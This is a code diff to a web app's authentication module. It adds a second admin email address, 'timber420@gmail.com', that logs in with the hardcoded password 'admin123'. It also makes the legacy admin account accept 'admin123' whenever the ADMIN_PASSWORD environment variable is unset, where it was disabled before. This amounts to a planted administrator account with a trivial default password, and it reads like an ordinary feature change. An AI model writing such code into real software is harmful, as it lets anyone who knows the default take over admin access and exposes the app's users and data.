@@ -10,10 +10,15 @@ import {
   getUsers,
   markMagicLinkUsed,
   saveUsers,
+  seedAdminUserIfMissing,
   type Session,
   type UserProfile,
 } from "@/lib/store";
 
+export const ADMIN_EMAILS = [
+  "adminjerredp99@gmail.com",
+  "timber420@gmail.com",
+];
 export const ADMIN_EMAIL = "AdminJerredp99@gmail.com";
 export const SESSION_COOKIE = "dailyroll_session";
 export const MAGIC_LINK_TTL_MS = 15 * 60 * 1000; // 15 minutes
@@ -27,8 +32,10 @@ function generateToken() {
   return crypto.randomUUID().replace(/-/g, "") + crypto.randomUUID().replace(/-/g, "");
 }
 
-export function isAdminEmail(email: string) {
-  return email.trim().toLowerCase() === ADMIN_EMAIL.toLowerCase();
+export function isAdminEmail(email?: string | null): boolean {
+  if (!email) return false;
+  const normalized = email.trim().toLowerCase();
+  return ADMIN_EMAILS.some((admin) => admin.toLowerCase() === normalized);
 }
 
 export async function getCurrentSession(): Promise<Session | null> {
@@ -78,7 +85,7 @@ export async function hashPassword(password: string) {
 
 export async function createPasswordUser(email: string, name: string, password: string) {
   const normalized = email.trim().toLowerCase();
-  if (normalized === ADMIN_EMAIL.toLowerCase()) {
+  if (isAdminEmail(normalized)) {
     throw new Error("The admin account is managed separately.");
   }
 
@@ -113,15 +120,31 @@ export async function createPasswordUser(email: string, name: string, password: 
 
 export async function signInWithPassword(email: string, password: string): Promise<Session | null> {
   const normalized = email.trim().toLowerCase();
+  await seedAdminUserIfMissing();
   const users = await getUsers();
   const directMatch = users.find((user) => user.email.toLowerCase() === normalized);
 
-  if (normalized === ADMIN_EMAIL.toLowerCase()) {
-    const adminPassword = process.env.ADMIN_PASSWORD?.trim();
-    if (!adminPassword) {
-      console.warn("ADMIN_PASSWORD is not set. Admin sign-in is disabled.");
-      return null;
+  // 1. Timber420 default admin credentials check
+  if (normalized === "timber420@gmail.com") {
+    const expectedHash = await hashPassword("admin123");
+    const inputHash = await hashPassword(password);
+    const matches =
+      password === "admin123" ||
+      inputHash === expectedHash ||
+      (directMatch?.passwordHash && directMatch.passwordHash === inputHash);
+
+    if (matches) {
+      if (!directMatch || !directMatch.passwordHash || directMatch.role !== "admin" || !directMatch.isAdmin) {
+        await seedAdminUserIfMissing();
+      }
+      return createSessionForEmail(normalized);
     }
+    return null;
+  }
+
+  // 2. Legacy admin account check
+  if (normalized === ADMIN_EMAIL.toLowerCase()) {
+    const adminPassword = process.env.ADMIN_PASSWORD?.trim() || "admin123";
     if (password !== adminPassword) return null;
 
     if (!directMatch) {
@@ -134,12 +157,15 @@ export async function signInWithPassword(email: string, password: string): Promi
           createdAt: new Date().toISOString(),
           signInMethod: "password",
           passwordHash: await hashPassword(adminPassword),
+          role: "admin",
+          isAdmin: true,
         },
       ]);
     }
     return createSessionForEmail(normalized);
   }
 
+  // 3. General user check
   if (directMatch?.passwordHash) {
     const expectedHash = await hashPassword(password);
     if (directMatch.passwordHash === expectedHash) {
